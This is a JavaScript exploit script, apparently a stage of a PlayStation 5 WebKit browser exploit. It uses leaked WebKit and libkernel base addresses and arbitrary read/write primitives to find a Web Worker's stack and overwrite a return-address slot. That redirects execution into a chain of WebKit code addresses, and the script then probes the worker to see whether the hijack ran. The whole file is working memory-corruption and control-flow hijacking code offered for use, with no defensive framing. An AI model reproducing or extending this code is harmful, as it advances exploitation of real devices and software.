// worker_ctor_1340.js — chain of WK+0x56A58 (host ctor: leaked live, proven code addr).
// msg1 logged explicitly. msg2 verdict: TIMEOUT2 = ctor executes (tables' pop rsp is the liar).
(async () => {
  const say = async (s) => { try { await log("[wctor] " + s); } catch(e){} };
  const hx = (v) => { try { return "0x" + (BigInt(v) & 0xFFFFFFFFFFFFFFFFn).toString(16); } catch(e){ return "?"; } };
  const WK = BigInt(PS5.webkitBase||0), LK = BigInt(PS5.libkernelBase||0);
  let worker = null;
  try{
    worker = new Worker("payloads/worker_slave.js");
    await Promise.race([new Promise((res)=>{worker.onmessage=()=>res(1);worker.postMessage(0);}),
      new Promise((_,rej)=>setTimeout(()=>rej(new Error("t/o")),5000))]);
  }catch(e){ await say("ABORT handshake"); return; }
  let wstack = 0n;
  for(const h of [0x64218,0x6C218]){
    try{ let t=read64(LK+BigInt(h));
      for(let i=0;i<64&&t!==0n;i++){ if(read64(t+0xB0n)===0x80000n){ wstack=read64(t+0xA8n); break; } t=read64(t+0x38n); }
    }catch(e){}
    if(wstack) break;
  }
  const EXP = LK+0x1FD01n;
  let retslot = 0n, cnt = 0;
  try{ for(let o=0x7F000n;o<0x80000n;o+=8n){ if(read64(wstack+o)===EXP){ cnt++; if(!retslot) retslot=wstack+o; } } }catch(e){}
  if(cnt!==1){ await say("ABORT retfp="+cnt); return; }
  const cbase = malloc(0x1000), entry = cbase+0x100n;
  for(let i=0;i<64;i++) write64(entry+BigInt(i*8), WK+0x56A58n);
  write64(retslot, WK+0xA1138n);
  write64(retslot+8n, entry);
  await say("fired ctor-loop");
  worker.onmessage = () => { try{ log("[wctor] msg1 ANSWER"); }catch(e){} };
  worker.postMessage(0);
  await new Promise((r)=>setTimeout(r,800));
  worker.onmessage = () => { try{ log("[wctor] msg2 ANSWER2 => chain MISSED"); }catch(e){} };
  try{ worker.postMessage(0); }catch(e){}
  await new Promise((r)=>setTimeout(r,1200));
  await say("probe2 window over (no ANSWER2 logged => spinning/dead)");
  try{ send_notification("wctor done"); }catch(e){}
})();
